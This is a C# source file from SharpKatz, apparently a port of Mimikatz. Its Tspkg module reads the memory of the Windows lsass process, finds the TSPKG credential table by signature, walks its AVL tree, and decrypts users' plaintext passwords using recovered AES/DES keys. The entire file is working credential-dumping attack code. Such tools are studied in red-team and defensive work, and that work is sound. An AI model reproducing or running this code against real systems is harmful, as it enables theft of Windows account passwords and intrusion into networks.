//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Module.Msv1;

using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class Tspkg
    {

        static long max_search_size = 170000;

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_AVL_TABLE
        {
            public RTL_BALANCED_LINKS BalancedRoot;
            public IntPtr OrderedPointer;
            public uint WhichOrderedElement;
            public uint NumberGenericTableElements;
            public uint DepthOfTree;
            public IntPtr RestartKey;//PRTL_BALANCED_LINKS
            public uint DeleteCount;
            public IntPtr CompareRoutine; //
            public IntPtr AllocateRoutine; //
            public IntPtr FreeRoutine; //
            public IntPtr TableContext;
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_BALANCED_LINKS
        {
            public IntPtr Parent;//RTL_BALANCED_LINKS
            public IntPtr LeftChild;//RTL_BALANCED_LINKS
            public IntPtr RightChild;//RTL_BALANCED_LINKS
            public byte Balance;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
            public byte[] Reserved; // align
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_TS_PRIMARY_CREDENTIAL
        {
            IntPtr unk0; // lock ?
            public KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_TS_CREDENTIAL
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 108)]
            public byte[] unk0;

            LUID LocallyUniqueIdentifier;
            IntPtr unk1;
            IntPtr unk2;
            IntPtr pTsPrimary;//PKIWI_TS_PRIMARY_CREDENTIAL
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_TS_CREDENTIAL_1607
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 112)]
            public byte[] unk0;
            LUID LocallyUniqueIdentifier;
            IntPtr unk1;
            IntPtr unk2;
            IntPtr pTsPrimary; //PKIWI_TS_PRIMARY_CREDENTIAL
        }

        public static int FindCredentials(IntPtr hLsass, IntPtr tspkgMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            RTL_AVL_TABLE entry;
            IntPtr tsGlobalCredTableAddr;
            IntPtr llCurrent;

            tsGlobalCredTableAddr = Utility.GetListAdress(hLsass, tspkgMem, "tspkg.dll", max_search_size, oshelper.TSGlobalCredTableOffset, oshelper.TSGlobalCredTableSign);

            //Console.WriteLine("[*] Tspkg TSGlobalCredTable found at address {0:X}", tsGlobalCredTableAddr.ToInt64());

            if (tsGlobalCredTableAddr != IntPtr.Zero)
            {
                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, tsGlobalCredTableAddr, Marshal.SizeOf(typeof(RTL_AVL_TABLE)));
                entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);

                llCurrent = entry.BalancedRoot.RightChild;

                WalkAVLTables(ref hLsass, tsGlobalCredTableAddr, oshelper, iv, aeskey, deskey, logonlist);

                return 0;
            }
            else
            {
                return 1;
            }
        }

        private static void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            if (pElement == IntPtr.Zero)
                return;

            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Marshal.SizeOf(typeof(RTL_AVL_TABLE)));
            RTL_AVL_TABLE entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);

            if (entry.OrderedPointer != IntPtr.Zero)
            {
                byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, Marshal.SizeOf(oshelper.TSCredType));

                LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSessionBytes, oshelper.TSCredLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
                long pCredAddr = BitConverter.ToInt64(krbrLogonSessionBytes, oshelper.TSCredOffset);

                byte[] pCredBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(pCredAddr), Marshal.SizeOf(typeof(KIWI_TS_PRIMARY_CREDENTIAL)));
                KIWI_TS_PRIMARY_CREDENTIAL pCred = Utility.ReadStruct<KIWI_TS_PRIMARY_CREDENTIAL>(pCredBytes);

                UNICODE_STRING usUserName = pCred.credentials.UserName;
                UNICODE_STRING usDomain = pCred.credentials.Domaine;
                UNICODE_STRING usPassword = pCred.credentials.Password;

                string username = Utility.ExtractUnicodeStringString(hLsass, usUserName);
                string domain = Utility.ExtractUnicodeStringString(hLsass, usDomain);
                
                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, usPassword.Buffer, usPassword.MaximumLength);

                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);

                string passDecrypted = "";
                UnicodeEncoding encoder = new UnicodeEncoding(false, false, true);
                try
                {
                    passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
                }
                catch (Exception)
                {
                    passDecrypted = Utility.PrintHexBytes(msvDecryptedPasswordBytes);
                }

                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {

                    Credential.Tspkg krbrentry = new Credential.Tspkg();
                    krbrentry.UserName = username;

                    if (!string.IsNullOrEmpty(domain))
                    {
                        krbrentry.DomainName = domain;
                    }
                    else
                    {
                        krbrentry.DomainName = "[NULL]";
                    }

                    // Check if password is present
                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        krbrentry.Password = passDecrypted;

                    }
                    else
                    {
                        krbrentry.Password = "[NULL]";
                    }

                    Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid);
                        currentlogon.UserName = username;

                        currentlogon.Tspkg = krbrentry;
                        logonlist.Add(currentlogon);
                    }
                    else
                    {
                        currentlogon.Tspkg = krbrentry;
                    }
                }
            }

            if (entry.BalancedRoot.RightChild != IntPtr.Zero)
                WalkAVLTables(ref hLsass, entry.BalancedRoot.RightChild, oshelper, iv, aeskey, deskey, logonlist);
            if (entry.BalancedRoot.LeftChild != IntPtr.Zero)
                WalkAVLTables(ref hLsass, entry.BalancedRoot.LeftChild, oshelper, iv, aeskey, deskey, logonlist);

        }
    }
}
